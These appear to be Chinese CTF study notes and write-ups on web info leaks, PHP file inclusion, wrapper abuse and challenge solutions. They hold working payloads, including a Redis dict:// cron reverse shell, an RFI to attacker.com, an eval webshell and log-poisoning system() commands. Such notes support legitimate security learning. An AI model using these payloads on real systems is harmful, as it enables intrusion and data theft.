## 信息泄露
#### 目录遍历
进入后一级一级寻找，直到找到flag.txt点开得到flag
#### PHPINFO
PHPInfo函数信息泄露漏洞常发生一些默认的安装包，比如phpstudy等，默认安装完成后，没有及时删除这些提供环境测试的文件，比较常见的为phpinfo.php、1.php和test.php，然后通过phpinfo获取的php环境以及变量等信息，但这些信息的泄露配合一些其它漏洞将有可能导致系统被渗透和提权。
进入后搜索FLAG找到flag
#### 备份文件下载
###### 网站源码
写一个Python脚本，遍历网站源码文件名的每一种可能
```python
import requests  
url = "http://challenge-37eaa1354d995e66.sandbox.ctfhub.com:10800/"  
  
li1 = ['web','website','backup','back','www','wwwroot','temp']  
li2 = ['tar','tar.gz','zip','rar']  
for i in li1:  
    for j in li2:  
        url_final=url+"/"+i+"."+j  
        r=requests.get(url_final)  
        print(str(r)+"+"+url_final)
```

运行脚本，找到状态码为200的网址点进去下载到源码文件，找到文件中的.txt文件，用网址访问这个文件后得到flag`http://challenge-37eaa1354d995e66.sandbox.ctfhub.com:10800/flag_915214932.txt`
###### bak文件
根据提示可知源码在index.php.bak文件中，访问`http://challenge-2384fe6eaf47e42e.sandbox.ctfhub.com:10800/index.php.bak`下载文件打开源码，可以得到flag
###### vim缓存
在使用vim编辑命令时，因错误操作或系统问题强制退出，会自动生成一个swp文件（并且是隐藏的），保存修改时的所有内容，在环境url后输入`/.index.php.swp`会自动下载备份文件，用文档打开可得到flag
###### .DS_Store
在url后面输入.DS_Store,下载.DS_Store文件打开后，倒数的第二行隐藏着一个.txt文件的文件名（将中间的空格删掉），在url后面输入那个文件名得到flag
#### GIT泄露
###### log
当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。
现在控制台输入`git clone https://github.com/BugScanTeam/GitHack.git`下载githack
再`cd GitHack`,再输入`py -2 GitHack.py http://challenge-a77ad3d2a80b03b1.sandbox.ctfhub.com:10800/.git/`(即网址后加.git/)等待运行结束（时间有点长），最后显示一个文件路径，`cd 这个路径`，进来之后输入`git show`显示出flag
###### stash
前面操作同上一关，`cd 这个路径后`却无法得到flag,需要输入`git stash list`列出 stash 条目,看到一个flag,再输入`git stash pop`应用该条目，可以看到一句` deleted by us:   29664775720345.txt`,然后在刚才的路径下找到这个文件，点开后得到flag.
###### index
完全同log那一关
#### SVN泄露
当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。
svn泄露需要用dvcs-ripper工具，需要在kali-linux虚拟机里运行，打开虚拟机，`cd dvcs-ripper`再输入`perl rip-svn.pl -u url/.svn/`在`ls -al`发现有一个.svn文件说明有.svn泄露，再`cd .svn`再`tree`,发现下面有一个文件十分长的文件，在pristine目录下，cat   一下那个文件得到flag
## HG泄露
当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。
用上题方法扫描到有.hg泄露，cd .hg 再用`grep -r flag*`看到一个flag开头的文件，用浏览器访问他，得到flag
## 文件包含漏洞
### LFI本地文件包含
#### LFI漏洞产生原理及相关函数
程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为包含。
​ 程序开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件,造成文件包含漏洞。  
#### 文件包含常用函数
- include(): 执行到include()函数时才包含文件，当找不到文件时会产生警告，然后继续执行后续脚本。
- require(): 与include()的区别在于当找不到文件时，会产生致命错误，并停止脚本。
- include_once()：和Include()函数相同的作用，只不过若文件已经被包含，则不会再次包含。
- require_once(): 和require文件相同的作用，若文件已经被包含，则不会再次包含。
#### LFI各种绕过手法
- 管道符绕过：`cmd1|cmd2`  `cmd1`的输出结果会被直接 “输送” 给`cmd2`，作为`cmd2`的输入。当目标存在命令注入漏洞（如用户输入被直接拼接到系统命令中执行），用`|`将注入的命令与原命令拼接,如`127.0.0.1 | cat /f lag`输出flag
- `||`：逻辑或（前命令失败时执行后命令，如`false || whoami`）
- 分号（`;`）是**命令分隔符**，核心作用是在同一行依次执行多个命令，无论前一个命令成功或失败，后续命令都会继续执行。
- `%00`截断法，注释掉后面内容
- 套好多层`../`进行路径穿越
- 若`../`被替换为空，且只执行一次，可以双写绕过`..././`
- 字符串拼接利用语言特性拼接被过滤的关键字（如 PHP 的`.`运算符）：
假设过滤`passwd`，可构造：`?file=/etc/pas'||'swd`（PHP 中会解析为`/etc/passwd`）
- 若后端对输出字符串进行过滤，可以用伪协议对输出内容进行加密，如`php://filter/read=convert.base64-encode/resource=index.php`以base64加密的形式输出源码
#### 伪协议
1. `file://`协议：用来读取本地的文件，当用于文件读取函数时可以用。
- 常见检测是否存在漏洞写法：`www.xxx.com/?file=file:///etc/passwd`
- 此协议不受allow_url_fopen,allow_url_include配置影响
2. `php://input`协议，此协议一般用于输入getshell的代码,
使用方法：在GET处填上php://input如下`www.xxx.xxx/?cmd=php://input`然后用hackbar工具postphp代码进行检验，如`<?php>phpinfo()?>`,此协议受allow_url_include配置影响
3. `php://filter`协议，此协议一般用于查看源码，一般用法如下，`www.xxx.xxx/?file=php://filter/read=convert.base64-encode/resource=index.php`出来是base64编码，需要解码，此协议不受allow_url_fopen,allow_url_include配置影响
4. `data://`协议，需要allow_url_fopen,allow_url_include均为on，这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：`http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>`text/plain表示的是文本，`text/plain;base64`, 若纯文本没用可用base64编码，data://协议可以将文本伪装成一个文件
5. `dict://`协议，与gopher协议一般都出现在**ssrf**协议中，用来探测端口的指纹信息。同时也可以用它来代替gopher协议进行ssrf攻击。
- 检测端口指纹：`192.168.0.0/?url=dict://192.168.0.0:6379`以上为探测6379端口的开发
- 开启反弹shell的监听`nc -l 9999`
- 依次执行下面的命令`curl dict://192.168.0.119:6379/set:mars:"\n\n * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n\n"`
- `curl dict://192.168.0.119:6379/config:set:dir:/etc/`
- `curl dict://192.168.0.119:6379/config:set:dbfilename:crontab`
- `curl dict://192.168.0.119:6379/bgsave*`

1. `gopher://`协议，gopher://协议经常用来打内网的各种应用如mysql redis等。一般要用一些工具来进行构造payload 如gopherus等
2. `zip://`协议，zip://协议可以用来访问服务器中的压缩包，无论压缩包里面的文件是什么类型的都可以执行。也就是说如果服务器禁止我们上传php文件那么我们可以把php文件改后缀然后压缩再上传，然后用zip协议访问。要利用zip协议时一般要结合文件上传与文件包含两个漏洞，一般代码为`www.xxx.xxx/?file=zip:///php.zip#phpinfo.jpg`其中的#后表示的是php.zip的子文件名。有时候#需要变成%23，url编码。
3. compress.bzip2://协议,与zip协议类似不过要压缩成bzip2格式的
4. compress.zlib://协议,与zip协议类似不过要压缩成zlib格式的
5. phar://协议，phar://协议与zip://协议类似，它也可以访问zip包，访问的格式与zip的不同，如下所示`http://127.0.0.1/include.php? file=phar:///phpinfo.zip/phpinfo.txt`用/隔开了子文件
6. ftp:// 可用于网络端口扫描
7. 在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。
8. TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
9. - 读取敏感文件（`file://`、`php://filter`）；
- 执行任意代码（`php://input`、`data://`）；
- 绕过路径 / 后缀限制（`zip://`、`phar://`）。
#### 目录穿越
当 Web 应用程序使用用户可控的参数（如文件名、路径）来访问服务器文件系统时，如果没有对输入进行严格过滤，攻击者可以通过注入`../`（表示上级目录）或类似的路径序列，回溯到系统的其他目录，从而访问未授权的文件。  
正常请求是`?file=test.txt`，读取`/var/www/html/files/test.txt`。
若攻击者传入`?file=../../etc/passwd`，则实际访问路径变为：
`/var/www/html/files/../../etc/passwd` → 简化后为`/etc/passwd`（Linux 系统的敏感用户信息文件），从而实现越权访问。  
- `../`表示上级目录，`..\`（Windows 系统反斜杠）
- 为绕过简单过滤，可对`../`进行编码，如：
- URL 编码：`%2e%2e%2f`（`../`的 URL 编码）、`%2e%2e%5c`（`..\`的 URL 编码）。
- 双重编码：`%252e%252e%252f`（绕过解码一次的过滤）。
- 空字节截断：`../etc/passwd%00`（在 PHP < 5.3.4 且`magic_quotes_gpc=Off`时，可截断后续路径）。
### RFI远程文件包含
#### 原理
当 Web 应用程序使用用户可控的参数（如 URL 中的`file`参数）作为`include()`、`require()`等文件包含函数的参数，且未对该参数进行严格过滤，同时服务器开启了`allow_url_include`（PHP 配置）时，攻击者可以指定一个远程服务器上的恶意文件 URL（如`http://attacker.com/malicious.php`），使应用程序将其包含并执行。  
```php
// 应用从URL参数获取要包含的文件路径
$file = $_GET['file'];
// 直接包含用户指定的文件
include($file);
```
攻击者构造请求：`http://victim.com/index.php?file=http://attacker.com/shell.php`，若满足条件，应用会加载并执行`shell.php`中的恶意代码（如反弹 shell、读取敏感文件等）。  
若目标服务器允许上传文件（如图片），攻击者可上传包含 PHP 代码的文件（如伪装为`image.jpg`，内容为`<?php eval($_POST['code']); ?>`），再通过 RFI 包含该上传文件的 URL（如`?file=http://victim.com/uploads/image.jpg`），实现代码执行。
## 文件包含漏洞题目
### include
先随便传一个file参数，得到源码，flag再flag.php里，可以用php://filter伪协议`?file=php://filter/read=convert.base64-encode/resource=flag.php`再base64解码，得到flag
### funny_php
源码
```php
<?php  
    session_start();    highlight_file(__FILE__);  
    if(isset($_GET['num'])){  
        if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){  
            echo ":D";            $_SESSION['L1'] = 1;  
        }else{  
            echo ":C";  
        }  
    }  
    if(isset($_GET['str'])){        $str = preg_replace('/NSSCTF/',"",$_GET['str']);  
        if($str === "NSSCTF"){  
            echo "wow";            $_SESSION['L2'] = 1;  
        }else{  
            echo $str;  
        }  
    }  
    if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){  
        if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){  
            echo "Nice!";  
            if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){  
                if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){  
                    echo "yoxi!";                    $_SESSION['L3'] = 1;  
                }else{  
                    echo "X(";  
                }  
            }  
        }else{  
            echo "G";  
            echo $_POST['md5_1']."\n".$_POST['md5_2'];  
        }  
    }  
    if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){  
        include('flag.php');  
        echo $flag;  
    }    ?>
```
要进行多层绕过，第一层用科学计数法绕过，第二层用双写绕过，第三层的第一步可以用数组绕过，可后面又需要是字符串，但他是弱比较，所以可以用一些MD5后以0e开头的字符串绕过，得到flag,最终payload为`?num=9e9&str=NSNSSCTFSCTF`  `md5_1=s878926199a&md5_2=s155964671a`
### ZJCTF，不过如此
`?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php`首先用data协议把那句话伪装成文件，再用php://filter协议输出提示的next.php的文件内容，解码后是  
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
function getFlag(){
	@eval($_GET['cmd']);
}
```
其中`preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str)`  
- 第一个参数 `/(' . $re . ')/ei`：正则表达式模式，其中：
- `(` 和 `)`：捕获分组，将匹配到的内容存入 `\1`（反向引用）。
- `e`：**评估（evaluate）修饰符**，将替换字符串当作 PHP 代码执行（已废弃，度危险）。
- `i`：不区分大小写匹配。
- 第二个参数 `'strtolower("\\1")'`：替换字符串，`\\1` 会被替换为正则匹配到的内容（即第一个捕获分组的结果）。
- 第三个参数 `$str`：待处理的原始字符串。
- `/e` 修饰符的作用是：在替换时，将第二个参数（替换字符串）当作 PHP 代码执行，并将执行结果作为最终的替换值。
- foreach(_GET as $re => str)意思是get传参,str)意思是get传参,re=str,
1. 正则 `/(...)/` 匹配 `$str` 中的内容，假设匹配到 `X`，则 `\1` 代表 `X`。
2. 替换字符串会被解析为 `strtolower("X")`（`\\1` 被替换为 `X`）。
3. 由于 `/e` 修饰符，`strtolower("X")` 会被当作 PHP 代码执行。
4. 若 `X` 中包含恶意代码（如函数调用、变量解析等），则会被执行。
最后payloads为`http://node4.anna.nssctf.cn:28151/next.php?\S*=${getFlag()}&cmd=sys    tem('env');`next.php虽然无权访问，但可以在其目录下执行命令，`\S*` 和 `.*` 都表示匹配任意字符序列，但这里只可以用`\S*`,在 PHP 中，用`{}`包裹代码（如`${getFlag()}`）是利用了**双引号字符串中的变量解析特性**，其核心作用是**强制 PHP 执行`{}`内的表达式或函数调用**，并将结果嵌入字符串中。用`${getFlag()}`调用上面定义的函数，`\S*`匹配任意字符，匹配到后面的${getFlag()}，再执行cmd=命令;可以用`system('ls /');`和`system('find / -name *flag*')`;试一下，但都找不到flag,这时想到可能藏在环境变量里，就用`system('env');`或`phpinfo();`输出环境变量，找到flag
### 巴巴托斯！
将user-agent改为`FSCTF Browser`,试了一下改x-forward-for 和 x-real-ip都不行，再将referer改为`127.0.0.1`然后就没提示了，因为最开始的网址为`http://node4.anna.nssctf.cn:28578/index.php?file=show_image.php`所以可以试一下文件包含`index.php?file=/etc/passwd/`发现可以输出内容，用的nginx服务器，这时可以直接用php伪协议输出flag,`?file=php://filter/read=convert.base64-encode/resource=flag.php`(文件名是猜的)，或者文件包含，用`?file=<?php system('ls /');?>`网页显示报错，可是回显在日志里，访问一下日志，看到根目录里没有flag,可以列一下bin目录，看有哪些命令可以执行，反正find是不行了，可以直接用cat `?file=<?php system('cat fla*');?>`再访问日志`?file=/var/log/nginx/access.log`,滑到日志最下面，得到flag,命令之所以可以执行，是因为没有过滤，存在文件包含漏洞，如果日志回显的是网址，就在网址后加代码，入过日志里是user-agent，就在user-agent后加代码
### 高亮主题(划掉)背景查看器
如果修改的theme的话，就会自动发送一个请求，post`theme=theme1.php`但是传url参数没有任何反应，可以试一下post`theme=flag`就会报错`**Warning**: include(): Failed opening 'themes/flag' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/index.php** on line **11**`可以猜到是路径穿越，一层一层试，最后四层就好了，flag不行的话也可以试试flag.php,payload`theme=../../../../flag`或者可以用另一种方法，日志包含漏洞，因为访问`../../../../../var/log/nginx/access.log`看到日志里回显的是user-agent内容，可以抓包在user-agent后加入代码，如在后面加入`<?php system('ls /');?>`再访问一下日志，可以看到后面有一个flag文件，再cat一下就得到flag.,在日志里，或者可以传入一句话木马，连接蚁剑
## 进阶任务
### exit死亡绕过






